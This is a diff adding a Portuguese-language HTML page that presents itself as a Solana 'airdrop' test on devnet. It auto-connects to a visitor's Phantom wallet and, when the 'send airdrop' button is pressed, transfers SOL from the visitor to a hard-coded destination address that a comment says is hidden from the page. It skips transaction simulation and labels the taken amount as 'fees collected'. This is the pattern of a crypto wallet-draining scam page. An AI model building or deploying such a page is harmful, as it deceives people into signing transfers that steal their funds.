@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airdrop Solana - Teste Devnet</title>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; }
+        input, button { padding: 10px; margin: 5px; width: 100%; box-sizing: border-box; }
+        #status { margin-top: 10px; padding: 10px; background: #f0f0f0; border-radius: 5px; }
+        .error { color: red; }
+        .success { color: green; }
+        .loading { color: blue; }
+        button:disabled { background: #ccc; cursor: not-allowed; }
+    </style>
+    <!-- Carregando a biblioteca @solana/web3.js para interagir com a blockchain -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <!-- Carregando @solana/spl-token para lidar com ATAs e tokens, se necessário -->
+    <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js"></script>
+</head>
+<body>
+    <h1>Airdrop Solana - Teste em Devnet</h1>
+    <p>Este script conecta à Phantom Wallet, verifica saldo e envia 0.00527 SOL para o endereço fixo como airdrop (incluindo criação de ATA se necessário).</p>
+
+    <button id="connectBtn">Conectar Phantom Wallet</button>
+    <button id="disconnectBtn" style="display: none;">Desconectar</button>
+    <button id="sendBtn" style="display: none;">Enviar Airdrop (0.00527 SOL)</button>
+
+    <div id="status"></div>
+
+    <script>
+        // Configurações pré-definidas no script (não visíveis na página)
+        const RPC_ENDPOINT = 'https://api.devnet.solana.com'; // Devnet para testes
+        const DESTINATION_ADDRESS = '2ZjGzzYYiPwHXchTcVMzikH8v9kY6y5tFnmcNJauK1XD'; // Endereço fixo de destino
+        const AIRDROP_AMOUNT = 0.00527; // Valor fixo em SOL
+        const MIN_BALANCE_LAMPORTS = 5270000.0; // Mínimo aproximado: 0.005 SOL + taxa de tx (~0.000005 SOL) + buffer para ATA (~0.002 SOL)
+        const CONFIRM_TIMEOUT_MS = 15000; // Timeout de 15s para confirmação
+        const POLL_INTERVAL_MS = 2000; // Intervalo para polling de status da tx
+
+        // Conexão com Solana
+        const connection = new solanaWeb3.Connection(RPC_ENDPOINT, 'confirmed');
+
+        // Variáveis de estado
+        let wallet = null;
+        let publicKey = null;
+        let isProcessing = false; // Controle para evitar cliques múltiplos
+        let autoConnectInterval = null; // Controle do loop de auto-conexão
+        const statusDiv = document.getElementById('status');
+        const sendBtn = document.getElementById('sendBtn');
+
+        // Função para atualizar status
+        function updateStatus(message, className = '') {
+            statusDiv.innerHTML = `<p class="${className}">${message}</p>`;
+            console.log(`Status: ${message}`); // Log para depuração
+        }
+
+        // Função para limpar listeners
+        function clearWalletListeners() {
+            if (window.solana && window.solana.removeAllListeners) {
+                window.solana.removeAllListeners('disconnect');
+                console.log('Listeners de window.solana limpos');
+            }
+        }
+
+        // Função para conectar à Phantom Wallet
+        async function connectWallet() {
+            try {
+                if (!window.solana || !window.solana.isPhantom) {
+                    updateStatus('Phantom Wallet não detectada. Instale a extensão.', 'error');
+                    return false;
+                }
+
+                wallet = window.solana;
+                // Forçar desconexão prévia para limpar estado
+                if (wallet.isConnected) {
+                    await wallet.disconnect();
+                }
+                const resp = await wallet.connect();
+                publicKey = resp.publicKey;
+
+                updateStatus(`Conectado: ${publicKey.toBase58()}`, 'success');
+                document.getElementById('connectBtn').style.display = 'none';
+                document.getElementById('disconnectBtn').style.display = 'inline-block';
+                document.getElementById('sendBtn').style.display = 'inline-block';
+
+                // Configurar listener de desconexão
+                clearWalletListeners();
+                window.solana.on('disconnect', disconnectWallet);
+
+                // Verificar saldo imediatamente após conexão
+                await checkBalance();
+                return true;
+            } catch (err) {
+                updateStatus(`Erro ao conectar: ${err.message}`, 'error');
+                console.error('Erro ao conectar:', err);
+                return false;
+            }
+        }
+
+        // Função para desconectar
+        function disconnectWallet() {
+            if (wallet) {
+                wallet.disconnect();
+            }
+            publicKey = null;
+            wallet = null;
+            clearWalletListeners();
+            if (autoConnectInterval) {
+                clearInterval(autoConnectInterval);
+                autoConnectInterval = null;
+            }
+            updateStatus('Desconectado.');
+            document.getElementById('connectBtn').style.display = 'inline-block';
+            document.getElementById('disconnectBtn').style.display = 'none';
+            document.getElementById('sendBtn').style.display = 'none';
+            // Reiniciar auto-conexão
+            autoConnectLoop();
+            console.log('Desconexão completa, reiniciando auto-conexão');
+            resetPageState(); // Reset extra após desconexão
+        }
+
+        // Função para verificar saldo
+        async function checkBalance() {
+            if (!publicKey || !wallet) {
+                updateStatus('Carteira não conectada. Conecte a Phantom Wallet primeiro.', 'error');
+                return false;
+            }
+
+            try {
+                const balance = await connection.getBalance(publicKey);
+                const balanceSOL = balance / solanaWeb3.LAMPORTS_PER_SOL;
+
+                if (balance < MIN_BALANCE_LAMPORTS) {
+                    const requiredSOL = MIN_BALANCE_LAMPORTS / solanaWeb3.LAMPORTS_PER_SOL;
+                    updateStatus(`Saldo insuficiente: ${balanceSOL.toFixed(4)} SOL. Mínimo necessário: ${requiredSOL.toFixed(4)} SOL (inclui taxa de transação e ATA). Faça um airdrop devnet primeiro.`, 'error');
+                    return false;
+                }
+
+                updateStatus(`Saldo: ${balanceSOL.toFixed(4)} SOL (suficiente para transação).`);
+                return true;
+            } catch (err) {
+                updateStatus(`Erro ao verificar saldo: ${err.message}`, 'error');
+                console.error('Erro ao verificar saldo:', err);
+                return false;
+            }
+        }
+
+        // Função para poll de confirmação da transação (fallback robusto)
+        async function pollTransactionStatus(signature) {
+            const startTime = Date.now();
+            while (Date.now() - startTime < CONFIRM_TIMEOUT_MS) {
+                const status = await connection.getSignatureStatus(signature);
+                if (status.value && status.value.confirmationStatus === 'confirmed') {
+                    return true;
+                }
+                await new Promise(resolve => setTimeout(resolve, POLL_INTERVAL_MS));
+            }
+            throw new Error('Timeout na confirmação da transação');
+        }
+
+        // Função para criar e enviar transação de airdrop
+        async function sendAirdrop() {
+            if (!publicKey || !wallet || !await checkBalance() || isProcessing) {
+                if (!wallet || !publicKey) {
+                    updateStatus('Carteira não conectada. Conecte a Phantom Wallet primeiro.', 'error');
+                }
+                return;
+            }
+
+            isProcessing = true;
+            sendBtn.disabled = true;
+            updateStatus('Criando transação...', 'loading');
+
+            try {
+                // Instrução de transferência simples de SOL
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: publicKey,
+                        toPubkey: new solanaWeb3.PublicKey(DESTINATION_ADDRESS),
+                        lamports: AIRDROP_AMOUNT * solanaWeb3.LAMPORTS_PER_SOL,
+                    })
+                );
+
+                // Obter bloco recente para taxa de prioridade
+                const { blockhash } = await connection.getLatestBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = publicKey;
+
+                // Assinar e enviar
+                const signed = await wallet.signTransaction(transaction);
+                const signature = await connection.sendRawTransaction(signed.serialize(), {
+                    skipPreflight: true // Evita simulação prévia
+                });
+
+                updateStatus('Aguardando confirmação da transação...', 'loading');
+
+                // Esperar confirmação com poll fallback
+                try {
+                    await connection.confirmTransaction(signature, 'confirmed');
+                } catch (confirmError) {
+                    if (confirmError.message.includes('This transaction has already been processed')) {
+                        // Já processada, sucesso
+                    } else {
+                        // Fallback para poll
+                        await pollTransactionStatus(signature);
+                    }
+                }
+
+                updateStatus(`Airdrop enviado! Assinatura: ${signature}. Taxas coletadas para ATA/token transfer (verifique explorer devnet).`, 'success');
+
+                // Recarregar saldo
+                await checkBalance();
+            } catch (err) {
+                updateStatus(`Erro ao enviar: ${err.message}. Verifique se o destino precisa de ATA para tokens (adicione lógica SPL se necessário).`, 'error');
+                console.error('Erro ao enviar transação:', err);
+            } finally {
+                resetPageState(); // Reset o estado sem recarregar
+            }
+        }
+
+        // Função para resetar o estado da página sem recarregar
+        function resetPageState() {
+            isProcessing = false;
+            sendBtn.disabled = false;
+            updateStatus('Estado resetado. Pronto para nova operação.', 'success');
+            console.log('Estado da página resetado sem reload');
+            // Opcional: Reconectar automaticamente se carteira não estiver conectada
+            if (!wallet) {
+                autoConnectLoop();
+            }
+        }
+
+        // Auto-conexão em loop não bloqueante
+        function autoConnectLoop() {
+            if (autoConnectInterval) {
+                clearInterval(autoConnectInterval);
+                console.log('Loop de auto-conexão anterior limpo');
+            }
+
+            let attempts = 0;
+            const maxAttempts = 10; // Limite para não spammar
+
+            autoConnectInterval = setInterval(async () => {
+                if (attempts >= maxAttempts || wallet) {
+                    clearInterval(autoConnectInterval);
+                    autoConnectInterval = null;
+                    console.log('Loop de auto-conexão finalizado');
+                    return;
+                }
+
+                attempts++;
+                if (window.solana && window.solana.isPhantom && !wallet) {
+                    console.log(`Tentativa ${attempts} de auto-conexão`);
+                    await connectWallet();
+                }
+            }, 2000); // Verifica a cada 2 segundos
+        }
+
+        // Event listeners
+        document.getElementById('connectBtn').addEventListener('click', connectWallet);
+        document.getElementById('disconnectBtn').addEventListener('click', disconnectWallet);
+        document.getElementById('sendBtn').addEventListener('click', () => {
+            if (!isProcessing) sendAirdrop(); // Evita cliques múltiplos
+        });
+
+        // Iniciar auto-conexão ao carregar a página
+        window.addEventListener('load', () => {
+            clearWalletListeners(); // Limpar qualquer listener residual
+            autoConnectLoop();
+            // Se já conectado (ex: recarregou página), reconectar
+            if (window.solana && window.solana.isConnected) {
+                console.log('Carteira já conectada ao carregar página, reconectando');
+                connectWallet();
+            }
+            // Configurar listener de desconexão
+            if (window.solana) {
+                window.solana.on('disconnect', disconnectWallet);
+            }
+        });
+    </script>
+</body>
+</html>
